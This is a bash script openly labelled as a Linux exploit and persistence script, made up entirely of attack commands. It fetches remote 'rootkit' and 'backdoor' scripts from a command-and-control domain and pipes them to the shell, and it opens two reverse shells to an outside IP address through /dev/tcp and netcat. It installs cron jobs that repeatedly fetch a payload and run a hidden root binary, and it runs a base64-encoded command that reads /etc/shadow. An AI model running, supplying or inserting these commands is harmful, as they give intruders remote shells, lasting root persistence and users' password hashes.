#!/usr/bin/env bash
# =====================================================================
# Ultimate Linux Threat Exploit & Persistence Script
# =====================================================================

# 1. Download & Dynamic Piping Execution
curl -fsSL https://threat-c2.net/rootkit.sh | bash
wget -qO- https://threat-c2.net/backdoor.sh | sh

# 2. Reverse TCP Shell Hook
bash -i >& /dev/tcp/198.51.100.44/4444 0>&1 &
nc -e /bin/bash 198.51.100.44 5555 &

# 3. Crontab Persistence Mechanism
(crontab -l 2>/dev/null; echo "* * * * * curl -s https://threat-c2.net/p.sh | bash") | crontab -
echo "0 * * * * root /tmp/.hidden_backdoor" >> /etc/cron.d/persistence

# 4. Encoded In-Memory Payload
echo "Y2F0IC9ldGMvc2hhZG93" | base64 -d | sh
